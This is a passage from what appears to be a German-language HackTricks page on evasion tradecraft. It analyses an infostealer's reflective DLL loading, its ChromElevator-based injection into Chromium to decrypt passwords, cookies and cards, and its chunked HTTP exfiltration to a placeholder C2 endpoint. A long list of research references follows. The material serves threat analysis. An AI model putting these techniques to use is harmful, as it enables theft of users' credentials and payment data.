- Dieser Helper speichert eine Second-Stage-DLL, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Schlüssel + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob reflectively (ohne `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) abgeleitet sind.<sup>[[25]](#references)</sup>
- Die ChromElevator-Routinen verwenden direct-syscall reflective process hollowing, um in einen laufenden Chromium-Browser zu injizieren, AppBound-Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkarten direkt aus SQLite-Datenbanken zu entschlüsseln, trotz der ABE-Härtung.


### Modulare In-Memory-Sammlung & chunked HTTP exfil

- `create_memory_based_log` durchläuft eine globale `memory_generators`-Funktionszeigertabelle und startet für jedes aktivierte Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.) einen Thread. Jeder Thread schreibt Ergebnisse in gemeinsam genutzte Buffer und meldet nach einem Join-Fenster von etwa 45 Sekunden seine Dateianzahl.
- Nach Abschluss wird alles mit der statisch gelinkten `miniz`-Bibliothek als `%TEMP%\\Log.zip` komprimiert. `ThreadPayload1` wartet anschließend 15 Sekunden und streamt das Archiv in 10-MB-Chunks per HTTP POST an `http://<C2>:6767/upload`, wobei eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) vorgetäuscht wird. Jeder Chunk fügt `User-Agent: upload`, `auth: <build_id>` und optional `w: <campaign_tag>` hinzu; der letzte Chunk hängt `complete: true` an, damit das C2 weiß, dass die Rekonstruktion abgeschlossen ist.

## Referenzen

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [16] [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)

{{#include ../banners/hacktricks-training.md}}
